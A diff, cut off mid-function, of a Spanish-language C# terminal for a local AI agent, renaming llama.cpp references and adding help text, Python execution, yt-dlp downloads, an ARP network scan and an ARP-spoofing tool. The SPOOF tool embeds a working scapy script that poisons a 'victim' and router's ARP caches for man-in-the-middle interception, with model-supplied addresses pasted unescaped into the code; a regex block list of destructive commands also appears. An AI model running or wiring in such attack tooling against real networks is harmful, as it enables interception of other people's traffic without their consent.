@@ -5,7 +5,7 @@ using System.Text;
 using System.Text.Json;
 using System.Text.RegularExpressions;
 
-namespace IaTerminal;
+namespace ECnet;
 
 public sealed class TerminalException : Exception
 {
@@ -222,6 +222,73 @@ public sealed class TerminalApplication
         return positional;
     }
 
+    /// <summary>
+    /// Ayuda de la SESIÓN INTERACTIVA, un comando por línea. La versión anterior
+    /// concatenaba todos los comandos en una sola línea muy larga: en una consola
+    /// angosta se partía y se leía como un solo bloque de texto sin sentido.
+    /// </summary>
+    private void WriteInteractiveHelp()
+    {
+        Console.ForegroundColor = ConsoleColor.DarkBlue;
+        Console.WriteLine("//== COMANDOS DE LA SESIÓN =====================//");
+        Console.ForegroundColor = ConsoleColor.Cyan;
+
+        void Row(string cmd, string desc)
+        {
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.Write("  " + cmd.PadRight(24));
+            Console.ForegroundColor = ConsoleColor.Gray;
+            Console.WriteLine(desc);
+        }
+
+        Row("/help", "esta ayuda");
+        Row("/clear", "limpiar el historial");
+        Row("/history", "muestra el historial de la sesión");
+        Row("/system [texto]", "consulta o cambia la instrucción de sistema");
+        Row("/modelos", "lista y cambia de modelo");
+        Row("/cambiar", "selector de modelos");
+        Row("/use <selector>", "cambia de modelo");
+        Row("/descargar", "descarga un modelo nuevo");
+        Row("/temp [valor]", "temperatura");
+        Row("/rp [valor]", "penalización por repetición");
+        Row("/topp [valor]", "top-p");
+        Row("/tokens [valor]", "tokens máximos por respuesta");
+        Row("/net [on|off]", "activa o desactiva la búsqueda");
+        Row("/harness <objetivo>", "modo agéntico por pasos");
+        Row("/stats", "tokens y velocidad del último turno");
+        Row("/exit", "salir de la sesión");
+
+        Console.WriteLine();
+        Console.ForegroundColor = ConsoleColor.DarkBlue;
+        Console.WriteLine("//== HERRAMIENTAS DEL AGENTE ==================//");
+        Console.ForegroundColor = ConsoleColor.Gray;
+        Console.WriteLine("  El agente puede leer archivos y carpetas, ejecutar");
+        Console.WriteLine("  comandos de PowerShell, escribir archivos, ejecutar");
+        Console.WriteLine("  código Python y buscar en internet.");
+        Console.WriteLine();
+        Console.WriteLine("  La ejecución, la escritura y el código Python SIEMPRE");
+        Console.WriteLine("  piden tu permiso: píldoras [permitir] [denegar] con las");
+        Console.WriteLine("  flechas, o s/n cuando la entrada está pipeada.");
+        Console.WriteLine();
+        Console.ForegroundColor = ConsoleColor.DarkBlue;
+        Console.WriteLine("//== ATAJOS ======================================//");
+        Console.ForegroundColor = ConsoleColor.Gray;
+        Console.WriteLine("  Ctrl+C  detener la respuesta en curso");
+        Console.WriteLine("  Ctrl+D  salir de la sesión");
+        Console.WriteLine("  F1      permitir (equivalente a clic en la píldora)");
+        Console.WriteLine("  F2      denegar  (equivalente a clic en la píldora)");
+        Console.WriteLine();
+        Console.ForegroundColor = ConsoleColor.DarkBlue;
+        Console.WriteLine("//== NOTAS ======================================//");
+        Console.ForegroundColor = ConsoleColor.Gray;
+        Console.WriteLine("  /tokens 512 produce respuestas más cortas.");
+        Console.WriteLine("  /harness planifica, usa herramientas, verifica y");
+        Console.WriteLine("  termina solo con [[DONE]] (máx. 15 pasos).");
+        Console.WriteLine();
+        Console.ForegroundColor = ConsoleColor.DarkGray;
+         Console.WriteLine("  Las pestañas de conversación NO están en la consola.");
+    }
+
     private int RunHelp()
     {
         Console.ForegroundColor = ConsoleColor.DarkBlue;
@@ -251,7 +318,7 @@ public sealed class TerminalApplication
         Console.WriteLine();
         Console.WriteLine("Opciones globales:");
         Console.WriteLine("  --model-dir RUTA               cambia la carpeta de modelos");
-        Console.WriteLine("  --runtime-dir RUTA             cambia la carpeta de llama_bin");
+        Console.WriteLine("  --runtime-dir RUTA             cambia la carpeta de ecnet_bin");
         Console.WriteLine("  --model SELECTOR               selecciona el modelo por nombre o número");
         Console.WriteLine("  --context N --max-tokens N      ajusta contexto y respuesta");
         Console.WriteLine("  --threads N --gpu-layers N      ajusta CPU y GPU");
@@ -268,7 +335,7 @@ public sealed class TerminalApplication
     {
         var version = typeof(TerminalApplication).Assembly.GetName().Version?.ToString() ?? "1.0.0";
         Console.WriteLine($"IA27 Terminal {version}");
-        Console.WriteLine("Runtime: C#/.NET 8 + llama.cpp; Python requerido: no");
+        Console.WriteLine("Runtime: C#/.NET 8 + ECnet; Python requerido: no");
         return 0;
     }
 
@@ -371,7 +438,7 @@ public sealed class TerminalApplication
         Console.CancelKeyPress += handler;
         try
         {
-            await using var session = new LlamaServerSession(config, model);
+            await using var session = new ECnetServerSession(config, model);
             Console.WriteLine($"[1/2] Cargando {model.Name}...");
             await session.StartAsync(cancellation.Token);
             Console.WriteLine("[2/2] Consultando el agente local...");
@@ -459,7 +526,7 @@ public sealed class TerminalApplication
             Console.CancelKeyPress += handler;
             try
             {
-                await using var session = new LlamaServerSession(config, model);
+                await using var session = new ECnetServerSession(config, model);
                 Console.WriteLine("Cargando el modelo; la primera carga puede tardar...");
                 await session.StartAsync(cancellation.Token);
                 Console.WriteLine("Listo. Escribe /help para ver los comandos del agente. Ctrl+C detiene la respuesta en curso.");
@@ -506,7 +573,7 @@ public sealed class TerminalApplication
         }
     }
 
-    private async Task<SessionAction> RunAgentLoopAsync(LlamaServerSession session, CancellationToken cancellationToken, ConsoleCancelState cancelState)
+    private async Task<SessionAction> RunAgentLoopAsync(ECnetServerSession session, CancellationToken cancellationToken, ConsoleCancelState cancelState)
     {
         while (true)
         {
@@ -583,17 +650,22 @@ public sealed class TerminalApplication
             }
             catch (TerminalException error)
             {
+                NotificationHelper.NotifyError(Truncate(error.Message, 100));
                 Console.Error.WriteLine($"Error: {error.Message}");
             }
             finally
             {
                 lastStats = notice.GetStats();
                 cancelState.Generation = null;
+                if (!turn.IsCancellationRequested)
+                {
+                    NotificationHelper.NotifyModelFinished("Respuesta completada");
+                }
             }
         }
     }
 
-    private async Task<SessionAction?> HandleAgentCommandAsync(LlamaServerSession session, string input, CancellationToken cancellationToken = default)
+    private async Task<SessionAction?> HandleAgentCommandAsync(ECnetServerSession session, string input, CancellationToken cancellationToken = default)
     {
         var separator = input.IndexOf(' ');
         var command = (separator < 0 ? input : input[..separator]).ToLowerInvariant();
@@ -606,10 +678,7 @@ public sealed class TerminalApplication
                 return new SessionAction(true, null);
             case "/help":
             case "/ayuda":
-                Console.WriteLine("/help  /clear  /history  /system [texto]  /modelos  /cambiar  /use <selector>  /descargar  /temp [valor]  /rp [valor]  /topp [valor]  /tokens [valor]  /net [on|off]  /harness <objetivo>  /stats  /exit");
-                Console.WriteLine("Ctrl+C detiene la respuesta en curso; /tokens 512 produce respuestas más cortas.");
-                Console.WriteLine("Herramientas del agente: puede leer archivos/carpetas ([[READ]]), ejecutar comandos PowerShell ([[CMD]]) y crear archivos ([[WRITE]]); ejecución y escritura siempre piden tu permiso (píldoras con las flechas, o s/n en script).");
-                Console.WriteLine("/harness <objetivo>: modo agéntico por pasos — el agente planifica, usa herramientas, verifica resultados y termina solo con [[DONE]] (máx. 15 pasos).");
+                WriteInteractiveHelp();
                 break;
             case "/stats":
             case "/estadisticas":
@@ -967,7 +1036,7 @@ public sealed class TerminalApplication
         Console.CancelKeyPress += handler;
         try
         {
-            await using var session = new LlamaServerSession(config, model);
+            await using var session = new ECnetServerSession(config, model);
             Console.WriteLine($"Cargando {model.Name}...");
             await session.StartAsync(cancellation.Token);
             Console.WriteLine($"Servidor local activo: {session.BaseUrl}");
@@ -994,7 +1063,7 @@ public sealed class TerminalApplication
     private static readonly Regex HarnessDonePattern = new(@"\[\[DONE\]\]", RegexOptions.Compiled);
     private const int HarnessMaxSteps = 15;
 
-    private async Task RunHarnessAsync(LlamaServerSession session, string objective, CancellationToken cancellationToken)
+    private async Task RunHarnessAsync(ECnetServerSession session, string objective, CancellationToken cancellationToken)
     {
         if (string.IsNullOrWhiteSpace(objective))
         {
@@ -1065,9 +1134,9 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
             return Task.CompletedTask;
         }
 
-        Console.ForegroundColor = ConsoleColor.DarkBlue;
-        Console.Write("IA27> ");
-        Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.ForegroundColor = ConsoleColor.DarkGray;
+                Console.Write("pensando...");
+                Console.ForegroundColor = ConsoleColor.Cyan;
         var content = await session.AskContinueAsync(bufferedToken, cancellationToken);
         for (var step = 1; step <= HarnessMaxSteps; step++)
         {
@@ -1202,9 +1271,13 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
     }
     // ===== Herramientas de agente: READ / CMD / WRITE =====
 
-    private static readonly Regex ReadRequestPattern = new(@"\[\[READ\]\]\s*(?<path>[^\r\n]+)", RegexOptions.Compiled);
+    private static readonly Regex ReadRequestPattern = new(@"\[\[READ\]\]\s*(?<path>[^\r\n]+?)(?:\s*\[\[END\]\])?\s*$", RegexOptions.Compiled);
     private static readonly Regex CmdRequestPattern = new(@"\[\[CMD\]\]\s*(?<cmd>[^\r\n]+)", RegexOptions.Compiled);
     private static readonly Regex WriteRequestPattern = new(@"\[\[WRITE\]\]\s*(?<path>[^\r\n]+?)\s*::\s*(?<body>[\s\S]*?)\s*\[\[END\]\]", RegexOptions.Compiled);
+    private static readonly Regex PyRequestPattern = new(@"\[\[PY\]\]\s*(?<code>[\s\S]*?)\s*\[\[END\]\]", RegexOptions.Compiled);
+    private static readonly Regex YtdlpRequestPattern = new(@"\[\[YTDLP\]\]\s*(?<url>\S+)(?:\s+(?<format>\w+))?", RegexOptions.Compiled);
+    private static readonly Regex ScanRequestPattern = new(@"\[\[SCAN\]\]\s*(?<range>\S+)", RegexOptions.Compiled);
+    private static readonly Regex SpoofRequestPattern = new(@"\[\[SPOOF\]\]\s*(?<victim>\S+)\s+(?<router>\S+)(?:\s+(?<iface>\S+))?", RegexOptions.Compiled);
     private static readonly Regex WriteMarkerPresent = new(@"\[\[WRITE\]\]", RegexOptions.Compiled);
     private static readonly Regex EndMarkerPattern = new(@"\[\[END\]\]", RegexOptions.Compiled);
     private static readonly Regex DangerousCommandPattern = new(@"\b(?:format|diskpart|bcdedit|vssadmin)\b|remove-item[^\r\n]*-recurse[^\r\n]*-force|rm\s+-rf|del\s+/[sq]|rd\s+/s|shutdown|restart-computer|stop-computer|reg\s+delete|takeown|icacls[^\r\n]*/reset|clear-disk|initialize-disk|set-executionpolicy\s+unrestricted", RegexOptions.Compiled | RegexOptions.IgnoreCase);
@@ -1227,6 +1300,37 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
 
     private sealed record ToolRequest(string Kind, string Argument, string? Body);
 
+    // El usuario habla español; el Qwen2.5 a veces degenera a chino (PARTE 27 / sesión 29-9).
+    // Umbral: más de 10 caracteres CJK y más del 3% de las letras del texto, para no interceptar
+    // una palabra china citada de pasada en una respuesta en español.
+    private static readonly Regex CjkCharPattern = new(@"[一-鿿　-〿＀-￯]", RegexOptions.Compiled);
+    private static readonly Regex ChineseRequestedPattern = new(@"\b(?:chin[oa]s?|mandar[ií]n|中文|al\s+chino)\b", RegexOptions.Compiled | RegexOptions.IgnoreCase);
+
+    private static bool ContainsExcessiveCjk(string text)
+    {
+        if (text.Length < 20)
+        {
+            return false;
+        }
+
+        var cjk = 0;
+        var letters = 0;
+        foreach (var c in text)
+        {
+            if (c is >= '一' and <= '鿿')
+            {
+                cjk++;
+                letters++;
+            }
+            else if (char.IsLetter(c))
+            {
+                letters++;
+            }
+        }
+
+        return cjk > 10 && letters > 0 && cjk * 100 / letters > 3;
+    }
+
     /// <summary>
     /// ¿El usuario denegó el permiso? Si se contara como "herramienta ejecutada", el modelo que
     /// reintenta después de una negativa se encontraría con la guarda de escritura duplicada y un
@@ -1246,13 +1350,59 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
         var cmdMatch = CmdRequestPattern.Match(content);
         if (cmdMatch.Success)
         {
-            return new ToolRequest("CMD", TrimStrayEndMarker(cmdMatch.Groups["cmd"].Value).Trim().Trim('"'), null);
+            var cmd = TrimStrayEndMarker(cmdMatch.Groups["cmd"].Value).Trim();
+            cmd = Regex.Replace(cmd, @"\\+""", "\"");
+            if (cmd.Length >= 2 && cmd.StartsWith('"') && cmd.EndsWith('"'))
+            {
+                cmd = cmd[1..^1].Trim();
+            }
+            cmd = TranslateCmdExeCommand(cmd);
+            return new ToolRequest("CMD", cmd, null);
         }
 
         var readMatch = ReadRequestPattern.Match(content);
         if (readMatch.Success)
         {
             return new ToolRequest("READ", RepairToolPathFromContext(TrimStrayEndMarker(readMatch.Groups["path"].Value).Trim().Trim('"'), content), null);
+        }
+
+        var pyMatch = PyRequestPattern.Match(content);
+        if (pyMatch.Success)
+        {
+            return new ToolRequest("PY", pyMatch.Groups["code"].Value.Trim(), null);
+        }
+
+        var ytdlpMatch = YtdlpRequestPattern.Match(content);
+        if (ytdlpMatch.Success)
+        {
+            var url = ytdlpMatch.Groups["url"].Value.Trim();
+            var format = ytdlpMatch.Groups["format"].Success ? ytdlpMatch.Groups["format"].Value.Trim().ToLowerInvariant() : "mp4";
+            if (url.Length >= 10)
+            {
+                return new ToolRequest("YTDLP", url + "|" + format, null);
+            }
+        }
+
+        var scanMatch = ScanRequestPattern.Match(content);
+        if (scanMatch.Success)
+        {
+            var range = scanMatch.Groups["range"].Value.Trim();
+            if (range.Length >= 7)
+            {
+                return new ToolRequest("SCAN", range, null);
+            }
+        }
+
+        var spoofMatch = SpoofRequestPattern.Match(content);
+        if (spoofMatch.Success)
+        {
+            var victim = spoofMatch.Groups["victim"].Value.Trim();
+            var router = spoofMatch.Groups["router"].Value.Trim();
+            var iface = spoofMatch.Groups["iface"].Success ? spoofMatch.Groups["iface"].Value.Trim() : "Ethernet";
+            if (victim.Length >= 7 && router.Length >= 7)
+            {
+                return new ToolRequest("SPOOF", victim + "|" + router + "|" + iface, null);
+            }
         }
 
         return null;
@@ -1378,6 +1528,7 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
         var cleaned = WriteRequestPattern.Replace(content, string.Empty);
         cleaned = CmdRequestPattern.Replace(cleaned, string.Empty);
         cleaned = ReadRequestPattern.Replace(cleaned, string.Empty);
+        cleaned = PyRequestPattern.Replace(cleaned, string.Empty);
         cleaned = WriteMarkerPresent.Replace(cleaned, string.Empty);
         cleaned = EndMarkerPattern.Replace(cleaned, string.Empty);
         return cleaned.TrimEnd();
@@ -1519,6 +1670,97 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
         throw new TerminalException($"No existe el archivo ni la carpeta: {path}");
     }
 
+    // Switches de PowerShell (-Recurse, -Force, -Path...) pueden ir ANTES o DESPUÉS de la ruta,
+    // y el modelo a veces deja la comilla de apertura sin la de cierre. Este patrón tolera todo eso.
+    private const string PsPathArg = @"(?:(?:-\w+(?::\w+)?)\s+)*(?:-Path\s+)?(?:""(?<p1>[^""]+)""?|(?<p2>[^']+)|(?<p3>[^\s]+(?:\s+[^-\s][^\s]*)*?))(?:\s+(?:-\w+(?::\w+)?))*\s*$";
+
+    private static string ExtractPathArg(Match match)
+        => (match.Groups["p1"].Value + match.Groups["p2"].Value + match.Groups["p3"].Value).Trim().Trim('"');
+
+    // El 7B conoce cmd.exe mejor que PowerShell y emite "rmdir /s /q X", "del /q X", "rd X":
+    // esos comandos NO existen en PowerShell (o son alias de otra cosa) y el bucle de reintento
+    // se comía 4 turnos. El host los traduce a Remove-Item antes de mostrar el permiso.
+    // Transparencia: el usuario ve el comando YA traducido en la píldora de permiso.
+    private static readonly Regex CmdExeRmdirPattern = new(@"^\s*(?:rmdir|rd)\s+(?<rest>.+)$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
+    private static readonly Regex CmdExeDelPattern = new(@"^\s*(?:del|erase)\s+(?<rest>.+)$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
+
+    private static string TranslateCmdExeCommand(string cmd)
+    {
+        var rmdirMatch = CmdExeRmdirPattern.Match(cmd);
+        if (rmdirMatch.Success)
+        {
+            var rest = rmdirMatch.Groups["rest"].Value;
+            var recursive = Regex.IsMatch(rest, @"(?:^|\s)/s(?:\s|$)", RegexOptions.IgnoreCase);
+            var path = Regex.Replace(rest, @"(?:^|\s)/[sq](?=\s|$)", " ", RegexOptions.IgnoreCase).Trim().Trim('"');
+            if (path.Length >= 2)
+            {
+                return "Remove-Item -LiteralPath \"" + path + "\"" + (recursive ? " -Recurse" : string.Empty) + " -Force";
+            }
+        }
+
+        var delMatch = CmdExeDelPattern.Match(cmd);
+        if (delMatch.Success)
+        {
+            var rest = delMatch.Groups["rest"].Value;
+            var path = Regex.Replace(rest, @"(?:^|\s)/[a-z]+(?=\s|$)", " ", RegexOptions.IgnoreCase).Trim().Trim('"');
+            if (path.Length >= 2)
+            {
+                return "Remove-Item -LiteralPath \"" + path + "\" -Force";
+            }
+        }
+
+        return cmd;
+    }
+
+    private static string? TryConvertCmdToPython(string command)
+    {
+        var cmd = command.Trim();
+
+        var createDirMatch = Regex.Match(cmd, @"^\s*(?:New-Item|mkdir|md)\s+(?:(?:-ItemType\s+Directory)\s+)?(?:(?:-\w+(?::\w+)?)\s+)*(?:-Path\s+)?(?:""(?<p1>[^""]+)""?|(?<p2>[^']+)|(?<p3>.+?))(?:\s+(?:-\w+(?::\w+)?))*\s*$", RegexOptions.IgnoreCase);
+        if (createDirMatch.Success)
+        {
+            var path = ExtractPathArg(createDirMatch);
+            if (path.Length >= 3)
+            {
+                return "import os\nos.makedirs(\"" + path + "\", exist_ok=True)\nprint('OK: carpeta creada')";
+            }
+        }
+
+        var moveMatch = Regex.Match(cmd, @"^\s*Move-Item\s+(?:(?:-\w+(?::\w+)?)\s+)*(?:-Path\s+)?(?:""(?<s1>[^""]+)""?|(?<s2>[^']+)|(?<s3>[^\s]+(?:\s+[^-\s][^\s]*)*?))\s+(?:-Destination\s+)?(?:""(?<d1>[^""]+)""?|(?<d2>[^']+)|(?<d3>.+?))(?:\s+(?:-\w+(?::\w+)?))*\s*$", RegexOptions.IgnoreCase);
+        if (moveMatch.Success)
+        {
+            var source = (moveMatch.Groups["s1"].Value + moveMatch.Groups["s2"].Value + moveMatch.Groups["s3"].Value).Trim().Trim('"');
+            var dest = (moveMatch.Groups["d1"].Value + moveMatch.Groups["d2"].Value + moveMatch.Groups["d3"].Value).Trim().Trim('"');
+            if (source.Length >= 3 && dest.Length >= 3)
+            {
+                return "import shutil\nshutil.move(\"" + source + "\", \"" + dest + "\")\nprint('OK: carpeta movida')";
+            }
+        }
+
+        var copyMatch = Regex.Match(cmd, @"^\s*Copy-Item\s+(?:(?:-\w+(?::\w+)?)\s+)*(?:-Path\s+)?(?:""(?<s1>[^""]+)""?|(?<s2>[^']+)|(?<s3>[^\s]+(?:\s+[^-\s][^\s]*)*?))\s+(?:-Destination\s+)?(?:""(?<d1>[^""]+)""?|(?<d2>[^']+)|(?<d3>.+?))(?:\s+(?:-\w+(?::\w+)?))*\s*$", RegexOptions.IgnoreCase);
+        if (copyMatch.Success)
+        {
+            var source = (copyMatch.Groups["s1"].Value + copyMatch.Groups["s2"].Value + copyMatch.Groups["s3"].Value).Trim().Trim('"');
+            var dest = (copyMatch.Groups["d1"].Value + copyMatch.Groups["d2"].Value + copyMatch.Groups["d3"].Value).Trim().Trim('"');
+            if (source.Length >= 3 && dest.Length >= 3)
+            {
+                return "import shutil\nshutil.copy(\"" + source + "\", \"" + dest + "\")\nprint('OK: copiado')";
+            }
+        }
+
+        var removeMatch = Regex.Match(cmd, @"^\s*Remove-Item\s+(?:(?:-\w+(?::\w+)?)\s+)*(?:-Path\s+)?(?:""(?<p1>[^""]+)""?|(?<p2>[^']+)|(?<p3>.+?))(?:\s+(?:-\w+(?::\w+)?))*\s*$", RegexOptions.IgnoreCase);
+        if (removeMatch.Success)
+        {
+            var path = ExtractPathArg(removeMatch);
+            if (path.Length >= 3 && !path.StartsWith("-"))
+            {
+                return "import os, shutil\np = \"" + path + "\"\nshutil.rmtree(p) if os.path.isdir(p) else os.remove(p)\nprint('OK: eliminado')";
+            }
+        }
+
+        return null;
+    }
+
     private static async Task<string> ExecuteCmdToolAsync(string command, CancellationToken cancellationToken)
     {
         var startInfo = new ProcessStartInfo("powershell.exe")
@@ -1574,6 +1816,313 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
         }
 
         return builder.ToString().TrimEnd();
+    }
+
+    private static async Task<string> ExecutePyToolAsync(string code, CancellationToken cancellationToken)
+    {
+        var pythonExe = ResolvePythonPath();
+        if (pythonExe is null)
+        {
+            return "ERROR: no se encontró Python en el sistema. Instalá Python 3.x desde python.org o configurá la ruta con: portable.exe config set python-path \"C:\\Python312\\python.exe\"";
+        }
+
+        var startInfo = new ProcessStartInfo(pythonExe)
+        {
+            WorkingDirectory = Environment.CurrentDirectory,
+            UseShellExecute = false,
+            CreateNoWindow = true,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            StandardOutputEncoding = Encoding.UTF8,
+            StandardErrorEncoding = Encoding.UTF8
+        };
+        startInfo.ArgumentList.Add("-c");
+        startInfo.ArgumentList.Add(code);
+
+        using var process = Process.Start(startInfo) ?? throw new TerminalException("No se pudo iniciar Python.");
+        using var timeout = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+        timeout.CancelAfter(TimeSpan.FromSeconds(30));
+        var outputTask = process.StandardOutput.ReadToEndAsync(timeout.Token);
+        var errorTask = process.StandardError.ReadToEndAsync(timeout.Token);
+        try
+        {
+            await process.WaitForExitAsync(timeout.Token);
+        }
+        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
+        {
+            try { process.Kill(entireProcessTree: true); } catch (InvalidOperationException) { }
+            return "El código Python excedió el límite de 30 segundos y fue detenido.";
+        }
+
+        var output = (await outputTask).Trim();
+        var error = (await errorTask).Trim();
+        var builder = new StringBuilder();
+        builder.AppendLine($"Código Python ejecutado (carpeta {Environment.CurrentDirectory}):");
+        builder.AppendLine(Truncate(code, 500));
+        builder.AppendLine($"Código de salida: {process.ExitCode}");
+        if (output.Length > 0)
+        {
+            builder.AppendLine("Salida:");
+            builder.AppendLine(Truncate(output, 2000));
+        }
+
+        if (error.Length > 0)
+        {
+            builder.AppendLine("Errores:");
+            builder.AppendLine(Truncate(error, 1000));
+        }
+
+        if (output.Length == 0 && error.Length == 0)
+        {
+            builder.AppendLine("(sin salida)");
+        }
+
+        return builder.ToString().TrimEnd();
+    }
+
+    private static async Task<string> ExecuteYtdlpToolAsync(string url, string format, CancellationToken cancellationToken)
+    {
+        var downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
+        Directory.CreateDirectory(downloadsPath);
+        var outputTemplate = Path.Combine(downloadsPath, "%(title)s.%(ext)s");
+
+        var startInfo = new ProcessStartInfo("yt-dlp.exe")
+        {
+            WorkingDirectory = downloadsPath,
+            UseShellExecute = false,
+            CreateNoWindow = true,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            StandardOutputEncoding = Encoding.UTF8,
+            StandardErrorEncoding = Encoding.UTF8
+        };
+
+        if (format == "mp3")
+        {
+            startInfo.ArgumentList.Add("-x");
+            startInfo.ArgumentList.Add("--audio-format");
+            startInfo.ArgumentList.Add("mp3");
+        }
+        else
+        {
+            startInfo.ArgumentList.Add("-f");
+            startInfo.ArgumentList.Add(format);
+        }
+
+        startInfo.ArgumentList.Add("-o");
+        startInfo.ArgumentList.Add(outputTemplate);
+        startInfo.ArgumentList.Add(url);
+
+        using var process = Process.Start(startInfo) ?? throw new TerminalException("No se pudo iniciar yt-dlp. Instalalo con: winget install yt-dlp.yt-dlp");
+        using var timeout = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+        timeout.CancelAfter(TimeSpan.FromMinutes(10));
+        var outputTask = process.StandardOutput.ReadToEndAsync(timeout.Token);
+        var errorTask = process.StandardError.ReadToEndAsync(timeout.Token);
+        try
+        {
+            await process.WaitForExitAsync(timeout.Token);
+        }
+        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
+        {
+            try { process.Kill(entireProcessTree: true); } catch (InvalidOperationException) { }
+            return "La descarga excedió el límite de 10 minutos y fue detenida.";
+        }
+
+        var output = (await outputTask).Trim();
+        var error = (await errorTask).Trim();
+        var builder = new StringBuilder();
+        builder.AppendLine($"Descarga con yt-dlp (carpeta {downloadsPath}):");
+        builder.AppendLine($"URL: {url}");
+        builder.AppendLine($"Formato: {format}");
+        builder.AppendLine($"Código de salida: {process.ExitCode}");
+        if (output.Length > 0)
+        {
+            builder.AppendLine("Salida:");
+            builder.AppendLine(Truncate(output, 2000));
+        }
+
+        if (error.Length > 0)
+        {
+            builder.AppendLine("Errores:");
+            builder.AppendLine(Truncate(error, 1000));
+        }
+
+        return builder.ToString().TrimEnd();
+    }
+
+    private static async Task<string> ExecuteScanToolAsync(string range, CancellationToken cancellationToken)
+    {
+        var pythonExe = ResolvePythonPath();
+        if (pythonExe is null)
+        {
+            return "ERROR: no se encontró Python en el sistema.";
+        }
+
+        var script = @"
+from scapy.all import ARP, Ether, srp
+paquete = Ether(dst=""ff:ff:ff:ff:ff:ff"") / ARP(pdst=""" + range + @")
+resultado, _ = srp(paquete, timeout=2, verbose=False)
+for _, respuesta in resultado:
+    print(f""IP: {respuesta.psrc} - MAC: {respuesta.hwsrc}"")
+";
+
+        var startInfo = new ProcessStartInfo(pythonExe)
+        {
+            WorkingDirectory = Environment.CurrentDirectory,
+            UseShellExecute = false,
+            CreateNoWindow = true,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            StandardOutputEncoding = Encoding.UTF8,
+            StandardErrorEncoding = Encoding.UTF8
+        };
+        startInfo.ArgumentList.Add("-c");
+        startInfo.ArgumentList.Add(script);
+
+        using var process = Process.Start(startInfo) ?? throw new TerminalException("No se pudo iniciar Python.");
+        using var timeout = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+        timeout.CancelAfter(TimeSpan.FromSeconds(30));
+        var outputTask = process.StandardOutput.ReadToEndAsync(timeout.Token);
+        var errorTask = process.StandardError.ReadToEndAsync(timeout.Token);
+        try
+        {
+            await process.WaitForExitAsync(timeout.Token);
+        }
+        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
+        {
+            try { process.Kill(entireProcessTree: true); } catch (InvalidOperationException) { }
+            return "El escaneo excedió el límite de 30 segundos y fue detenido.";
+        }
+
+        var output = (await outputTask).Trim();
+        var error = (await errorTask).Trim();
+        var builder = new StringBuilder();
+        builder.AppendLine($"Escaneo ARP de la red local (rango {range}):");
+        builder.AppendLine($"Código de salida: {process.ExitCode}");
+        if (output.Length > 0)
+        {
+            builder.AppendLine("Dispositivos encontrados:");
+            builder.AppendLine(output);
+        }
+
+        if (error.Length > 0)
+        {
+            builder.AppendLine("Errores:");
+            builder.AppendLine(Truncate(error, 1000));
+        }
+
+        if (output.Length == 0 && error.Length == 0)
+        {
+            builder.AppendLine("(sin resultados)");
+        }
+
+        return builder.ToString().TrimEnd();
+    }
+
+    private static async Task<string> ExecuteSpoofToolAsync(string victimIp, string routerIp, string iface, CancellationToken cancellationToken)
+    {
+        var pythonExe = ResolvePythonPath();
+        if (pythonExe is null)
+        {
+            return "ERROR: no se encontró Python en el sistema.";
+        }
+
+        var script = @"
+from scapy.all import ARP, send, get_if_hwaddr
+import time, sys
+
+victim_ip = """ + victimIp + @"
+router_ip = """ + routerIp + @"
+interface = """ + iface + @"
+
+mac_atacante = get_if_hwaddr(interface)
+paquete_victima = ARP(op=2, pdst=victim_ip, hwdst=""ff:ff:ff:ff:ff:ff"", psrc=router_ip, hwsrc=mac_atacante)
+paquete_router = ARP(op=2, pdst=router_ip, hwdst=""ff:ff:ff:ff:ff:ff"", psrc=victim_ip, hwsrc=mac_atacante)
+
+print(f""Envenenando ARP: {victim_ip} y {router_ip} via {interface}"")
+print(""Presiona Ctrl+C para detener."")
+try:
+    while True:
+        send(paquete_victima, verbose=False)
+        send(paquete_router, verbose=False)
+        time.sleep(1)
+except KeyboardInterrupt:
+    print(""\nDetenido."")
+";
+
+        var startInfo = new ProcessStartInfo(pythonExe)
+        {
+            WorkingDirectory = Environment.CurrentDirectory,
+            UseShellExecute = false,
+            CreateNoWindow = true,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            StandardOutputEncoding = Encoding.UTF8,
+            StandardErrorEncoding = Encoding.UTF8
+        };
+        startInfo.ArgumentList.Add("-c");
+        startInfo.ArgumentList.Add(script);
+
+        using var process = Process.Start(startInfo) ?? throw new TerminalException("No se pudo iniciar Python.");
+        using var timeout = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+        timeout.CancelAfter(TimeSpan.FromMinutes(5));
+        var outputTask = process.StandardOutput.ReadToEndAsync(timeout.Token);
+        var errorTask = process.StandardError.ReadToEndAsync(timeout.Token);
+        try
+        {
+            await process.WaitForExitAsync(timeout.Token);
+        }
+        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
+        {
+            try { process.Kill(entireProcessTree: true); } catch (InvalidOperationException) { }
+            return "El ataque ARP spoofing excedió el límite de 5 minutos y fue detenido.";
+        }
+
+        var output = (await outputTask).Trim();
+        var error = (await errorTask).Trim();
+        var builder = new StringBuilder();
+        builder.AppendLine($"ARP spoofing ejecutado (victima {victimIp}, router {routerIp}, interfaz {iface}):");
+        builder.AppendLine($"Código de salida: {process.ExitCode}");
+        if (output.Length > 0)
+        {
+            builder.AppendLine("Salida:");
+            builder.AppendLine(Truncate(output, 2000));
+        }
+
+        if (error.Length > 0)
+        {
